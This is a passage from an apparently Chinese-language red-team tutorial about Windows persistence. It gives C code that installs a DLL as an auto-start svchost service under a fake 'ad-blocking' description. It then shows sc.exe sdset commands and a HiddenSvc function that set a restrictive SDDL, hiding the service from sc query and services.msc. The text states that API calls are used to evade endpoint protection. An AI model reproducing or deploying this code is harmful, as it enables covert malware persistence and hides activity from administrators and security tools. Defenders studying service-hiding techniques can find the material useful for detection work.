    RegCloseKey(hkRoot);
    SetLastError(rc);
    if (bExist == false)
    {
        lpServiceName = new char[strlen(servicename) + 1];
        strcpy(lpServiceName, servicename);
    }
    //回到 InstallService
    return lpServiceName;
}
void myStartService(char lpService[])
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (NULL != hSCManager)
    {
        SC_HANDLE hService = OpenServiceA(hSCManager, lpService, DELETE | 
SERVICE_START);
        if (NULL != hService)
        {
            StartService(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
}
int ServerSetup(char strModulePath[])
{
    //CreateEXE("E:\\aaa.dll", IDR_DLL1, "DLL");
    char lpServiceDescription[] = "提供windows屏蔽垃圾广告服务";
    char strSubKey[1024];
    DWORD   dwStartType = 0;
    char    strRegKey[1024];
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;
    //打开服务
    hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    char bin[] = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
    char* lpServiceName = AddsvchostService();                             //*添
加的代码在这个函数中*
    //这里返回新的服务名后就构造服务dll的名字
    // 
    //然后构造服务中的描述信息的位置
    sprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", 
lpServiceName);
    printf("[*] StrRegKey: %s\n", strRegKey);
    schService = CreateServiceA(
        hscm,                       // SCManager database
        lpServiceName,              // name of service
        lpServiceName,       // service name to display
        SERVICE_ALL_ACCESS,         // desired access
        SERVICE_WIN32_SHARE_PROCESS,
        SERVICE_AUTO_START,         // start type
        SERVICE_ERROR_NORMAL,       // error control type
        bin,                        // service's binary
        NULL,                       // no load ordering group
        NULL,                       // no tag identifier
        NULL,                       // no dependencies
        NULL,                       // LocalSystem account
        NULL);                      // no password
    dwStartType = SERVICE_WIN32_SHARE_PROCESS;
    if (schService == NULL)
    {
        throw "CreateService(Parameters)";
        printf("schServicenull");
    }
    CloseServiceHandle(schService);
    //CloseServiceHandle(hscm);
    hkRoot = HKEY_LOCAL_MACHINE;
    //这里构造服务的描述键
    sprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", 
lpServiceName);
    if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
    {
        DWORD   dwServiceType = 0x120;
        HKEY  hKey;
        DWORD dwDisposition;
        LSTATUS status; 
        //写入服务的描述
        status = RegCreateKeyExA(HKEY_LOCAL_MACHINE, strSubKey, 0, NULL, 
REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
        if (status == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "Description", 0, REG_SZ, 
(LPBYTE)lpServiceDescription, strlen(lpServiceDescription) + 1);
            RegSetValueExA(hKey, "Type", 0, REG_DWORD, (LPBYTE)&dwServiceType, 
sizeof(DWORD));
            RegCloseKey(hKey);
            strcat(strSubKey, "\\Parameters");
            status = RegCreateKeyExA(HKEY_LOCAL_MACHINE, strSubKey, 0, NULL, 
REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
            RegSetValueExA(hKey, "ServiceDll", 0, REG_EXPAND_SZ, 
(LPBYTE)strModulePath, strlen(strModulePath)+1);
            RegCloseKey(hKey);
        }  
        //写入服务的描述
    }
    //写入服务的描述
    if (schService != NULL)
    {
        //CreateEXE(strModulePath, IDR_DLL1, "DLL");
        myStartService(lpServiceName);
    }
    RegCloseKey(hkRoot);
    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);
    //system("pause");
    return 0;
}
int main()
{
     CHAR ServerBin[] = 
"C:\\Users\\Administrator\\Desktop\\ConsoleApplication1\\Release\\ConsoleApplica
tion1.dll";
     ServerSetup(ServerBin);
     return 0;
}
注意安装程序的位数要和dll的位数相同，否则启动的时候会报193错误。
服务隐藏
参考文献
1. https://www.freebuf.com/articles/system/254838.html
2. https://www.sans.org/blog/red-team-tactics-hiding-windows-services/
3. https://cqureacademy.com/blog/windows-internals/sddl
4. https://www.cnblogs.com/zpchcbd/p/12374668.html
此服务隐藏的方法并不是我个人发现的，而是国外大佬发现的，参考链接在上面，我这里只是在分享一
下，并提供相关的c代码来实现。
说是隐藏服务，其实并没有真正的隐藏，只是此服务拒绝了系统中所有用户查看而已，注册表还可以看
到服务的
服务很容易溯源者发现，例如使用 sc qeury 命令，使用 services.msc 管理器都可以看到，隐蔽性不
够好。
windows中的任意一个安全对象的访问权限都是由一种安全描述符定义语言SDDL(Security Descriptor 
Definition Language),系统中的文件，进程，线程对象都有自己的SDDL。随便找个文件看一下：
SY,BA,LA对应着上面的三个用户或者组，FA表示完全控制权限，跟下面右图中的权限是对应上的。
SDDL的通用语法格式是：
先解释几个概念：
O:owner_sid
G:group_sid
D:dacl_flags(string_ace1)(string_ace2)... (string_acen)  //D后面跟的就是DACL，每一项
都被成为ACE
S:sacl_flags(string_ace1)(string_ace2)... (string_acen)  //S后面跟的就是SACL，每一项
都被成为ACE
其中ACE的格式定义是：
(ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid) 一共六列
都解释清楚了，拿下面就主要说一下服务的ACE的内容，直接看微软的文档 
https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings：
使用SC.exe 命令行隐藏
提供的SDDL语句是：
ACL( Access Control List ) : 访问控制列表，是由DACL和SACL构成的。也就是SDDL语言中的 D开
头的一串和S开头的一串
DACL( Discretionary Access Control List  ):自由访问控制列表,表示允许或拒绝访问安全对象的
受信者。 当 进程 尝试访问安全对象时，系统会检查对象的 DACL 中的 ACE 以确定是否授予对该对象的访
问权限。 如果对象没有 DACL，则系统会向每个人授予完全访问权限。 如果对象的 DACL 没有 ACE，则系
统会拒绝所有访问对象的尝试，因为 DACL 不允许任何访问权限。 系统会按顺序检查 AES，直到找到一个或
多个允许所有请求的访问权限的 AES，或直到任何请求的访问权限被拒绝。
SACL( System Access Control List  ): 系统访问控制列表,允许管理员记录访问安全对象的尝试。 
每个 ACE 指定指定受信者的访问尝试类型，这些访问尝试会导致系统在安全事件日志中生成记录。 SACL 中
的 ACE 可以在访问尝试失败、成功时或同时生成审核记录。 
ACE( Access Control Entry ) : ACL中的每一项，我们叫做ACE
ace_type
    A: -  Access Allowed
    D: -  Access Denied
    OA: - Object  Access Allowed
    OD: - Object  Access Denied
    AU: - System Auidt
    AL: - System Alarm
    OU: - System Object Audit
    OL: - System Object Alarm
    ML: - System MAndatory Label
ace_flag:
    OI：- 表示该ACE可以被子对象继承
    CI：- 表示该ACE可以被子容器继承
    IO：- 仅作用于子对象
    NP：- 仅被直接子容器继承，不继续向下继承
rights:
    CC：- 服务配置查询
    LC: - 服务状态查询
    SW: - SERVICE_ENUMERATE_DEPENDENTS
    RP: - 服务启动
    WP: - 服务停止
    DT: - 服务暂停
    DC: - 服务配置更改
    SD: - 删除
account_sid:
    "IU"：- 交互登陆用户
    "AU"：- 认证用户
    "SU"：- 服务登陆用户
最后可以通过如下命令隐藏服务：
恢复原来权限：
操作完成后，就无法查看到此服务了：
在服务管理器中也是看不到的:
使用代码自动隐藏
我们之前说过，所有用命令来完成的操作都是很容易被端防护软件采集到和拦截的，最好的方式还是使
用系统提供的API来完成，我们接下里就通过API来完成SDDL的设置
首先问题，服务的SDDL语言描述的权限到底存在哪里呢？翻一翻注册表，你会发现多了一个 Security
子键，里面有一个 Security 键值，这个键值表示的就是当前服务的权限控制。
D:(D;;DCLCWPDTSDCC;;;IU)
(D;;DCLCWPDTSDCC;;;SU)
(D;;DCLCWPDTSDCC;;;BA)
(A;;CCLCSWLOCRRC;;;IU)
(A;;CCLCSWLOCRRC;;;SU)
(A;;CCLCSWRPWPDTLOCRRC;;;SY)
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
sc.exe sdset FirstService "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)
(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:
(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
sc.exe sdset FirstService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)
(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
想直接通过写注册表的方式来实现有点难度，因为这一串16进制到底是什么含义，很难搞清楚，不过我
们不采用直接直接写注册表的方式，我们使用SCM提供的api来实现这个操作，代码示例如下：
VOID __stdcall HiddenSvc( const char szSvcName[])
{
    PSECURITY_DESCRIPTOR  sd;
    BOOL                 bDaclPresent = FALSE;
    BOOL                 bDaclDefaulted = FALSE;
    DWORD                dwError = 0;
    DWORD                dwSize = 0;
    DWORD                dwBytesNeeded = 0;
    // Get a handle to the SCM database. 
    SC_HANDLE schSCManager = OpenSCManager(
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 
    if (NULL == schSCManager)
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
    // Get a handle to the service
    SC_HANDLE schService = OpenServiceA(
        schSCManager,              // SCManager database 
        szSvcName,                 // name of service 
在安装服务的时候就可以自动设置为任何人无权查看，来进行隐藏。
        READ_CONTROL | WRITE_DAC); // access
    if (schService == NULL)
    {
        printf("OpenService failed (%d)\n", GetLastError());
        CloseServiceHandle(schSCManager);
        return;
    }
    CHAR szSD[] = "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)
(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:
(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
    BOOL ret =  ConvertStringSecurityDescriptorToSecurityDescriptorA(szSD, 
SDDL_REVISION_1, &sd, NULL);
    if (!ret) {
        printf("Failed CreateMyDACL\n");
        return;
    }
    if (!SetServiceObjectSecurity(schService,
        DACL_SECURITY_INFORMATION, sd))
    {
        printf("SetServiceObjectSecurity failed(%d)\n", GetLastError());
    }
    else printf("Service DACL updated successfully\n");
    CloseServiceHandle(schSCManager);
    CloseServiceHandle(schService);
}